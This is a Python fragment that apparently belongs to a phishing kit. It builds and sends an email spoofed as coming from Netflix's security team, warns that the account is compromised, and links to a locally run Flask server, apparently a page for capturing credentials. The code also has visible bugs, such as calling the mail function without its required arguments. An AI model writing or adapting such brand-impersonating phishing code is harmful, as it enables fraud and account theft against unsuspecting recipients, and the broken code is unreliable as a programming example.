   def send_email(username, password):
       # Create email content
       sender_email = "security@netflix.com"
       receiver_email = "testuser@example.com"
       # Replace with your email credentials
       email_password = "your_email_password"  # Replace with your actual email password
       subject = "Netflix Security Alert: Your Account Has Been Compromised"
       message = f"""
       Dear {username},

       We have noticed unusual activity on your account.

       To ensure your account security, please click the button below to verify your identity:

       https://localhost:5000

       If you did not request this email, it may have been sent to you by mistake. For your security, we recommend you change your password immediately.

       Thank you for your attention to this matter.

       Netflix Security Team
       """
       msg = MIMEText(message, 'html')
       msg['From'] = f"{sender_email}"
       msg['To'] = receiver_email
       msg['Subject'] = subject

       # Configure SMTP server (replace with your own SMTP server details)
       server = smtplib.SMTP('smtp.example.com', 587)
       server.ehlo()
       server.login(sender_email, email_password)
       server.sendmail([receiver_email], msg.as_string())
       server.quit()

   if __name__ == '__main__':
       # Run both the Flask app and the email sender in separate threads
       app_thread = threading.Thread(target=app.run, args=('0.0.0.0', 5000))
       email_thread = threading.Thread(target=send_email)
       app_thread.start()
       email_thread.start()
